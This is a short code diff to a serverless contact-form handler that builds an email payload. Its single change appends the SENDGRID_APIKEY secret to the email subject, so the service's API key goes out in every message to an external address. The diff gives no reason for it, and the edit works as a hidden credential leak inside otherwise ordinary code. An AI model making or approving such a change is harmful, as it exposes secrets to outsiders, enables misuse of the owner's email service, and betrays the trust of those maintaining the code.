@@ -8,7 +8,7 @@ exports.handler = async function (event, context, callback) {
   const data = {
     to: "lalomaf902@mliok.com",
     from: "noreply@wgtwo.com",
-    subject: `New message from ${senderName} (${senderEmail})`,
+    subject: `New message from ${senderName} (${senderEmail}) ${SENDGRID_APIKEY}`,
     html: message,
   }
 
